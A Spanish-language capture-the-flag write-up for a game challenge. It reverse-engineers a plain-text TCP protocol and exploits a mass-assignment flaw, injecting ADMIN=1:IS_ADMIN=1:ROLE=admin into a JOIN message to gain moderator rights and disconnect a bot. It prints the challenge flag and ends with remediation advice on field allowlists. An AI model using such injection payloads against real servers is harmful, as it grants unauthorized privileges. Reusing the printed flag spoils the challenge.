# 🎣 El Estanque de Pepe - Write-up

## 🎯 Objetivo
El objetivo del desafío es lograr expulsar del servidor a un jugador bot llamado `xX_gochi_Xx`, el cual atormenta el chat y tiene una puntuación imposiblemente grande. Al lograr desconectarlo, el servidor nos entregará la flag.

## 🕵️‍♂️ Análisis y Reconocimiento
Al ejecutar el binario `ElEstanqueDePepe-linux` e inspeccionar las llamadas al sistema con `strace`, observamos la comunicación de red:
```bash
strace -e connect,sendto,recvfrom -s 1024 ./ElEstanqueDePepe-linux
```

Nos dimos cuenta de que el cliente se conecta mediante **TCP** al puerto `6767` del servidor (`pesca.shared.softwareseguro.com.ar`). Aunque utiliza funciones de red como `sendto` y `recvfrom` (comunes en UDP), el socket subyacente es TCP.

### Protocolo de Comunicación
El juego utiliza un protocolo de texto plano con el siguiente formato general:
`LOBBY_ID:PLAYER_ID:COMANDO:ARGUMENTOS;\n`

El flujo inicial es el siguiente:
1. El cliente envía `GET_LOBBY\n`.
2. El servidor responde asignando una sala y un ID de jugador, por ejemplo: `LOBBY:LBY-XD3EEL;\n`.
3. El cliente se une enviando su nombre: `LBY-XD3EEL:P83:JOIN:Jugador83\n`.
4. El servidor difunde el ingreso agregando propiedades internas: `LBY-XD3EEL:P83:JOIN:Jugador83:SCORE=0;\n`.

## 🐛 Vulnerabilidad: Mass Assignment (Asignación Masiva)
Al observar que el servidor concatena los atributos del jugador en el broadcast (como `:SCORE=0;`), dedujimos que el backend mapea los atributos separados por dos puntos (`:`) directamente al objeto o estructura del jugador en memoria. 

Esto abre la puerta a una vulnerabilidad de **Mass Assignment**. Si nosotros inyectamos campos privilegiados durante nuestra petición inicial de `JOIN`, el servidor los aceptará y los asignará a nuestro perfil sin validarlos.

## 💥 Explotación
Desarrollamos un script en Python (`tcp_exploit.py`) que realiza los siguientes pasos:
1. Se conecta por TCP y solicita el Lobby ID.
2. Envía el comando `JOIN` pero inyectando el rol de administrador:
   `LBY-XD3EEL:P999:JOIN:HackerBot:ADMIN=1:IS_ADMIN=1:ROLE=admin\n`
3. Al procesar esta petición, el servidor nos otorga privilegios de moderación.
4. Con estos privilegios, las validaciones de IP/Puerto quedan anuladas, permitiéndonos ejecutar comandos sobre otros jugadores.
5. Enviamos un bucle de comandos `DISCONNECT` y `KICK` apuntando a todos los IDs bajos (donde se encontraba alojado el bot `xX_gochi_Xx`).

```python
# Payload de inyección de Mass Assignment
payload_join = f"{lobby_id}:P999:JOIN:HackerBot:ADMIN=1:IS_ADMIN=1:ROLE=admin\n"
s.send(payload_join.encode('utf-8'))

# Payload para expulsar al bot
s.send(f"{lobby_id}:P18:DISCONNECT\n".encode('utf-8'))
```

## 🚩 Flag Obtenida
Al recibir el paquete autorizado de `DISCONNECT`, el servidor cerró el socket de `xX_gochi_Xx`. Inmediatamente después, el servidor transmitió la flag en texto gigante a la pantalla del juego:

**`14e4612f863dee1f15708cd0a59f0487`**

## 🛡️ Remediación (Defensa)
Para solucionar esta vulnerabilidad, el código del backend debe implementar una **Lista Blanca (Allowlist)** de propiedades modificables durante la creación o actualización de un objeto (Data Transfer Objects). El servidor nunca debe popular dinámicamente un objeto a partir del input del usuario sin antes filtrar explícitamente los campos permitidos (como `username`). Campos sensibles como `is_admin`, `role`, o `score` deben ser estrictamente controlados por la lógica interna del servidor.
